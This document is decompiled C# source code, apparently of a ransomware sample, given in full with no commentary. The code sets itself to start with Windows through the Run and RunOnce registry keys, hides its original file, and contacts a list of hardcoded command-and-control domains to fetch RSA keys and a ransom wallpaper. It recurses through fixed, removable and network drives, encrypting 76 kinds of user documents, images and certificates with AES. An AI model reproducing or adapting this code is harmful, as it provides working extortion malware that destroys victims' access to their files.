using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;

public class GClass0
{
	public struct GStruct0
	{
		public int int_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public string string_3;

		public string string_4;

		public string string_5;

		public string string_6;
	}

	public string string_0 = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Cryptography", "MachineGuid", "");

	public string string_1 = "bSMMwxDWhhkyLIU/Q4dWXg==";

	public string string_2 = "<RSAKeyValue><Modulus>3YUdEa5ACyZ/51u81ESh8P5NOyMF3OAam+Zm8BD9Qt4+ckyLgQfeUC/gGmtzXFA4ppKawxgD5uxnWmjrBvqGVIXCiWRxfH4idp6IHCn7gqEwRc9cQk6O7r125EhEaM0V1VzykwO3Gbpmv6B6dPsd6deQSnE8ZH0lbHkRRz55yBD+ZfN7/w+87uffbWVygeiwi4C01D2OgWMujbtaimuDUwTFylUSzVMS1CirAWBYj8kMNXE/GZNpNPiaJ9NfzlMO4afu6ciMiIXGFv5t8mC7xQl+2fwMSCjY9w7x60n90V+TYmPSAbnYRwa54Rw1dt41ca4hWhEsbjhz//vy6XVnqQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	public string string_3;

	public RegistryKey registryKey_0;

	public RegistryKey registryKey_1;

	public string string_4;

	public int int_0 = 7200;

	public double double_0 = 0.3;

	public int int_1 = 1000;

	public int int_2 = 1;

	public int int_3 = 1;

	public DateTime dateTime_0;

	public string string_5 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	public string[] string_6 = new string[76]
	{
		".3fr", ".accdb", ".ai", ".arw", ".bay", ".cdr", ".cer", ".cr2", ".crt", ".jpr",
		".pdf", ".crw", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docm", ".docx", ".dwg",
		".jpf", ".png", ".dxf", ".dxg", ".eps", ".erf", ".indd", ".jpe", ".jpg", ".kdc",
		".mdb", ".mdf", ".mp4", ".mef", ".mrw", ".nef", ".nrw", ".odb", ".odm", ".odp",
		".ods", ".odt", ".orf", ".gif", ".p12", ".p7b", ".p7c", ".pdd", ".pef", ".pem",
		".pfx", ".ppt", ".pptm", ".pptx", ".frx", ".psd", ".pst", ".ptx", ".r3d", ".raf",
		".raw", ".rtf", ".rw2", ".rwl", ".srf", ".accdb", ".srw", ".wb2", ".wpd", ".wps",
		".xlk", ".xls", ".xlsb", ".xlsm", ".xlsx", ".eml"
	};

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool MoveFileEx(string string_7, string string_8, int int_4);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int int_4, int int_5, string string_7, int int_6);

	public bool method_0(string string_7)
	{
		int num = 0;
		while (true)
		{
			if (num < string_7.Length)
			{
				char c = string_7[num];
				if (c < '0' || c > '9')
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	public void method_1()
	{
		method_7();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		string moduleName = Process.GetCurrentProcess().MainModule!.ModuleName;
		string arguments = "/F /IM " + moduleName;
		string text = folderPath + "\\" + string_3 + ".exe";
		registryKey_0 = Registry.CurrentUser.OpenSubKey("Software\\" + string_3 + "\\Files");
		registryKey_1 = Registry.CurrentUser.OpenSubKey("Software\\" + string_3 + "\\Keys");
		if (registryKey_1 == null)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\" + string_3 + "\\Keys", "", "", RegistryValueKind.String);
		}
		if (registryKey_0 == null)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\" + string_3 + "\\Files", "", "", RegistryValueKind.String);
		}
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", string_3, text, RegistryValueKind.String);
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "*" + string_3, text, RegistryValueKind.String);
		File.SetAttributes(fileName, FileAttributes.Hidden);
		if (Directory.Exists(folderPath) && !File.Exists(text))
		{
			Thread.Sleep(10000);
			try
			{
				File.Copy(fileName, text);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = text;
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
				processStartInfo2.UseShellExecute = false;
				processStartInfo2.CreateNoWindow = true;
				processStartInfo2.FileName = "taskkill";
				processStartInfo2.Arguments = arguments;
				Process.Start(processStartInfo);
				MoveFileEx(fileName, null, 4);
				Process.Start(processStartInfo2);
			}
			catch (Exception)
			{
			}
		}
	}

	public bool method_2(string string_7, int int_4)
	{
		bool result = false;
		string text = method_9(48, "");
		string text2 = method_8(string_7 + text);
		if (text2 != "")
		{
			int num = Convert.ToInt32(text2);
			if (num == int_4)
			{
				result = true;
				return true;
			}
		}
		return result;
	}

	public void method_3()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		string processName = Process.GetCurrentProcess().MainModule!.ModuleName!.Replace(".exe", "");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = fileName;
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			int num = processesByName.Length;
			if (num < 2)
			{
				Process.Start(processStartInfo);
			}
			Thread.Sleep(500);
		}
	}

	public string method_4()
	{
		bool flag = true;
		new Random();
		string[] array = new string[2] { "cabin.su", "wrax.ru" };
		string[] array2 = new string[3] { "icals.ru", "hips.su", "yot.su" };
		for (int i = 0; i < array.Length; i++)
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(array[i]);
				return hostEntry.HostName;
			}
			catch (SocketException)
			{
				flag = false;
			}
		}
		if (!flag)
		{
			for (int j = 0; j < array2.Length; j++)
			{
				try
				{
					IPHostEntry hostEntry2 = Dns.GetHostEntry(array2[j]);
					return hostEntry2.HostName;
				}
				catch (SocketException)
				{
				}
			}
		}
		return array[0];
	}

	public List<string> method_5()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		List<string> list = new List<string>();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType.ToString() == "Fixed" || driveInfo.DriveType.ToString() == "Removable" || driveInfo.DriveType.ToString() == "Network")
			{
				list.Add(driveInfo.Name);
			}
		}
		return list;
	}

	public bool method_6(string string_7)
	{
		Match match = Regex.Match(string_7.ToLower(), "c:\\\\users\\\\(.+)\\\\appdata\\\\(.+)?$");
		Match match2 = Regex.Match(string_7.ToLower(), "c:\\\\windows(\\\\$)?(.+)?$");
		Match match3 = Regex.Match(string_7.ToLower(), "c:\\\\program files(\\\\$)?(.+)?$");
		Match match4 = Regex.Match(string_7.ToLower(), "c:\\\\users\\\\public\\\\pictures\\\\sample pictures");
		Match match5 = Regex.Match(string_7.ToLower(), "c:\\\\program files \\(x64\\)(\\\\$)?(.+)?$");
		Match match6 = Regex.Match(string_7.ToLower(), "c:\\\\\\$(.+)?$");
		if (!match.Success && !match2.Success && !match3.Success && !match5.Success && !match4.Success && !match6.Success)
		{
			return false;
		}
		return true;
	}

	public string method_7()
	{
		SHA1CryptoServiceProvider sHA1CryptoServiceProvider = new SHA1CryptoServiceProvider();
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.IV = Convert.FromBase64String(string_1);
		ICryptoTransform transform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.IV, aesCryptoServiceProvider.IV);
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			using (StreamWriter streamWriter = new StreamWriter(stream))
			{
				streamWriter.Write(string_0);
			}
			string_3 = BitConverter.ToString(sHA1CryptoServiceProvider.ComputeHash(memoryStream.ToArray())).Replace("-", "");
		}
		string_3 = string_3.Substring(0, 10);
		return string_3;
	}

	public string method_8(string string_7)
	{
		bool flag = false;
		string text = null;
		while (!flag)
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(string_7);
				webRequest.Credentials = CredentialCache.DefaultCredentials;
				HttpWebResponse httpWebResponse = (HttpWebResponse)webRequest.GetResponse();
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				text = streamReader.ReadToEnd();
				if (text != null)
				{
					flag = true;
				}
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
			}
			catch (WebException)
			{
				continue;
			}
			Thread.Sleep(int_1);
		}
		return text;
	}

	public string method_9(int int_4, string string_7)
	{
		int num = 0;
		string result = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.FromXmlString(string_2);
		if (string_0 != "")
		{
			char[] array = string_0.ToCharArray();
			char[] array2 = new char[array.Length + 1];
			for (int i = 0; i < array.Length; i++)
			{
				if (i == 12)
				{
					array2[num++] = (char)int_4;
				}
				array2[num] = array[i];
				num++;
			}
			string s = new string(array2) + string_7;
			byte[] inArray = rSACryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(s), fOAEP: false);
			result = Convert.ToBase64String(inArray);
		}
		return result;
	}

	public void method_10()
	{
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_3 + ".img";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_3 + ".bmp";
		string keyName = "HKEY_CURRENT_USER\\Software\\" + string_3 + "\\Keys";
		byte[] bytes = (byte[])Registry.GetValue(keyName, "Wallpaper", "Can't receive wallpaper");
		File.WriteAllBytes(text, bytes);
		Bitmap val = (Bitmap)Image.FromFile(text);
		((Image)val).Save(text2);
		SystemParametersInfo(20, 0, text2, 3);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		registryKey.SetValue("WallpaperStyle", 0);
		registryKey.Close();
		File.SetAttributes(text, FileAttributes.Hidden);
		File.SetAttributes(text2, FileAttributes.Hidden);
		MoveFileEx(text, null, 4);
	}

	public void method_11(string string_7)
	{
		string text = method_9(53, "");
		string keyName = "HKEY_CURRENT_USER\\Software\\" + string_3 + "\\Keys";
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_3 + ".img";
		try
		{
			WebRequest webRequest = WebRequest.Create(string_7 + text);
			webRequest.Credentials = CredentialCache.DefaultCredentials;
			HttpWebResponse httpWebResponse = (HttpWebResponse)webRequest.GetResponse();
			BinaryReader binaryReader = new BinaryReader(httpWebResponse.GetResponseStream());
			byte[] array = binaryReader.ReadBytes(10485760);
			using (FileStream fileStream = new FileStream(path, FileMode.Create))
			{
				fileStream.Write(array, 0, array.Length);
			}
			byte[] value = File.ReadAllBytes(path);
			Registry.SetValue(keyName, "Wallpaper", value, RegistryValueKind.Binary);
			binaryReader.Close();
			httpWebResponse.Close();
			File.Delete(path);
			Thread.Sleep(int_1);
		}
		catch (WebException)
		{
		}
	}

	public bool method_12(string string_7)
	{
		bool flag = false;
		string keyName = "HKEY_CURRENT_USER\\Software\\" + string_3 + "\\Keys";
		string text = (string)Registry.GetValue(keyName, "Public", "");
		if (text == "")
		{
			string text3;
			while (true)
			{
				if (!flag)
				{
					string text2 = method_9(49, ":" + int_2 + ":" + int_3);
					text3 = method_8(string_7 + text2);
					if (text3 != "")
					{
						break;
					}
					Thread.Sleep(int_1);
					continue;
				}
				return false;
			}
			Registry.SetValue(keyName, "Public", text3, RegistryValueKind.String);
			flag = true;
			return true;
		}
		Console.WriteLine("Public already exsits");
		return true;
	}

	public bool method_13(string string_7)
	{
		bool flag = false;
		string keyName = "HKEY_CURRENT_USER\\Software\\" + string_3 + "\\Keys";
		string text = (string)Registry.GetValue(keyName, "Private", "");
		string text2 = method_9(51, "");
		string text3 = null;
		if (text != "")
		{
			flag = true;
		}
		while (!flag)
		{
			text3 = method_8(string_7 + text2);
			if (text3 != "503")
			{
				Registry.SetValue(keyName, "Private", text3, RegistryValueKind.String);
				flag = true;
			}
			Thread.Sleep(int_1);
		}
		return flag;
	}

	public void method_14(string string_7, GStruct0 gstruct0_0)
	{
		string string_8 = null;
		if (gstruct0_0.int_0 == 0)
		{
			string_8 = ":B:" + gstruct0_0.string_0;
		}
		if (gstruct0_0.int_0 == 1)
		{
			string_8 = ":M:" + gstruct0_0.string_1;
		}
		if (gstruct0_0.int_0 == 2)
		{
			string_8 = ":U:" + gstruct0_0.string_4 + ":" + gstruct0_0.string_2 + ":" + gstruct0_0.string_5 + ":" + gstruct0_0.string_3 + ":" + gstruct0_0.string_6;
		}
		string text = method_9(52, string_8);
		method_8(string_7 + text);
	}

	public void method_15(string string_7)
	{
		string text = method_9(50, "");
		string[] array = method_8(string_7 + text).Split(new char[1] { '+' });
		try
		{
			int_0 = Convert.ToInt32(array[0]);
			string_4 = array[1];
		}
		catch (Exception)
		{
		}
	}

	public bool method_16(string string_7)
	{
		string[] valueNames = registryKey_0.GetValueNames();
		string[] array = valueNames;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				string text = array[num];
				if (text == string_7)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public void method_17(string string_7)
	{
		string text = "HKEY_CURRENT_USER\\Software\\" + string_3;
		string keyName = text + "\\Keys";
		string keyName2 = text + "\\Files";
		string text2 = string_7 + ".tmp";
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		string text3 = (string)Registry.GetValue(keyName, "Public", "No Public Key was found!");
		if (!(text3 != ""))
		{
			return;
		}
		rSACryptoServiceProvider.FromXmlString(text3);
		byte[] inArray = rSACryptoServiceProvider.Encrypt(aesCryptoServiceProvider.IV, fOAEP: false);
		string text4 = Convert.ToBase64String(inArray);
		using (FileStream stream = new FileStream(text2, FileMode.Create))
		{
			using AesCryptoServiceProvider aesCryptoServiceProvider2 = new AesCryptoServiceProvider();
			using CryptoStream cryptoStream = new CryptoStream(stream, aesCryptoServiceProvider2.CreateEncryptor(aesCryptoServiceProvider.IV, aesCryptoServiceProvider.IV), CryptoStreamMode.Write);
			using FileStream fileStream = new FileStream(string_7, FileMode.Open);
			aesCryptoServiceProvider2.KeySize = 256;
			aesCryptoServiceProvider2.BlockSize = 128;
			int num;
			while ((num = fileStream.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
		}
		StreamWriter streamWriter = new StreamWriter(text2, append: true);
		streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter.Write(text4);
		streamWriter.Close();
		Registry.SetValue(keyName2, string_7, text4.Length, RegistryValueKind.DWord);
		File.Delete(string_7);
		File.Move(text2, string_7);
	}

	public void method_18(string string_7)
	{
		string text = "HKEY_CURRENT_USER\\Software\\" + string_3;
		string keyName = text + "\\Keys";
		_ = text + "\\Files";
		string text2 = string_7 + ".tmp";
		new AesCryptoServiceProvider();
		RSACryptoServiceProvider.UseMachineKeyStore = true;
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		string text3 = (string)Registry.GetValue(keyName, "Private", "No Private Key was found!");
		if (!(text3 != ""))
		{
			return;
		}
		rSACryptoServiceProvider.FromXmlString(text3);
		byte[] array = new byte[344];
		FileStream fileStream = new FileStream(string_7, FileMode.Open, FileAccess.Read);
		fileStream.Seek(-344L, SeekOrigin.End);
		fileStream.Read(array, 0, 344);
		string @string = Encoding.UTF8.GetString(array);
		byte[] rgb = Convert.FromBase64String(@string);
		byte[] array2 = rSACryptoServiceProvider.Decrypt(rgb, fOAEP: false);
		Convert.ToBase64String(array2);
		fileStream.Close();
		FileStream fileStream2 = new FileStream(string_7, FileMode.Open, FileAccess.ReadWrite);
		fileStream2.SetLength(fileStream2.Length - 344L);
		fileStream2.Close();
		using (FileStream stream = new FileStream(text2, FileMode.Create))
		{
			using AesManaged aesManaged = new AesManaged();
			using CryptoStream cryptoStream = new CryptoStream(stream, aesManaged.CreateDecryptor(array2, array2), CryptoStreamMode.Write);
			using FileStream fileStream3 = new FileStream(string_7, FileMode.Open);
			aesManaged.KeySize = 256;
			aesManaged.BlockSize = 128;
			int num;
			while ((num = fileStream3.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
		}
		File.Delete(string_7);
		File.Move(text2, string_7);
	}

	public void method_19(List<string> list_0, string string_7)
	{
		try
		{
			string[] files = Directory.GetFiles(string_7, "*.*");
			foreach (string text in files)
			{
				string extension = Path.GetExtension(text);
				string[] array = string_6;
				foreach (string text2 in array)
				{
					if (text2 == extension.ToLower() && !method_16(text))
					{
						list_0.Add(text);
						method_17(text);
					}
				}
			}
			string[] directories = Directory.GetDirectories(string_7);
			foreach (string string_8 in directories)
			{
				if (!method_6(string_8))
				{
					method_19(list_0, string_8);
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public string[] method_20()
	{
		registryKey_0 = Registry.CurrentUser.OpenSubKey("Software\\" + string_3 + "\\Files");
		return registryKey_0.GetValueNames();
	}

	public bool method_21(string string_7)
	{
		string name = "Software\\" + string_3 + "\\Files";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		if (File.Exists(string_7))
		{
			try
			{
				method_18(string_7);
			}
			catch (Exception)
			{
			}
			if (registryKey != null)
			{
				registryKey.DeleteValue(string_7);
				return true;
			}
			return false;
		}
		registryKey.DeleteValue(string_7);
		return false;
	}

	public int method_22()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + string_3 + "\\Files");
		string[] valueNames = registryKey.GetValueNames();
		return valueNames.Length - 1;
	}

	public void method_23()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] files = Directory.GetFiles(folderPath, "*.*");
		foreach (string text in files)
		{
			string extension = Path.GetExtension(text);
			string[] array = string_6;
			foreach (string text2 in array)
			{
				if (text2 == extension)
				{
					try
					{
						method_18(text);
					}
					catch (Exception)
					{
					}
				}
			}
		}
	}

	public void method_24()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text = folderPath + "\\" + string_3 + ".exe";
		string path = folderPath + "\\" + string_3 + ".bmp";
		string arguments = "/F /IM " + Process.GetCurrentProcess().MainModule!.ModuleName;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software", writable: true);
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true);
		registryKey2?.DeleteValue(string_3);
		registryKey3?.DeleteValue("*" + string_3);
		registryKey?.DeleteSubKeyTree(string_3);
		if (File.Exists(text))
		{
			File.SetAttributes(text, FileAttributes.Hidden);
			MoveFileEx(text, null, 4);
			try
			{
				File.Delete(path);
			}
			catch (Exception)
			{
			}
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "taskkill";
		processStartInfo.Arguments = arguments;
		Process.Start(processStartInfo);
	}
}
